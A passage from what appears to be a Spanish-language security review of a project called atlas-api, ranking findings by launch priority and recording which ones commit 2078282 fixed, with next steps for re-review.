   F4-SEC-05, F4-SEC-09 (fuga en la poda: el contrato del ICT ya la tiene), F4-SEC-11 (Excel) y F4-SEC-13 (o la
   verificación en flit-gitops de `RedesConfiables` y del nginx del host). *F4-SEC-01, 02, 03, 05 y 13 corregidos en
   `2078282`; falta poner `Atlas__Proxy__RedesConfiables` en el ConfigMap de qa y pdn (sin ella atlas-api ya no arranca).*
2. **Antes o con riesgo aceptado en un ADR firmado por el líder técnico:** F4-SEC-04, F4-SEC-06, F4-SEC-10, F4-SEC-12
   (con la `NetworkPolicy` verificada). *F4-SEC-04 corregido en `2078282`; F4-SEC-06 mitigado, con el riesgo del buzón en
   ATLAS-ADR-0049 a la espera de que el líder lo acepte.*
3. **Pueden seguir después del lanzamiento con fecha:** F4-SEC-07 y F4-SEC-08 (internos), los bajos y los informativos.
   *F4-SEC-07, 08, 14, 18, 19 y 21 corregidos en `2078282`.*

Con el punto 1 cerrado y el 2 resuelto o aceptado, la siguiente revisión puede ser corta: correr la carpeta
`Seguridad/` sin `Skip`, verificar los pendientes de la §4 en qa y la suite de la OpenID Foundation.
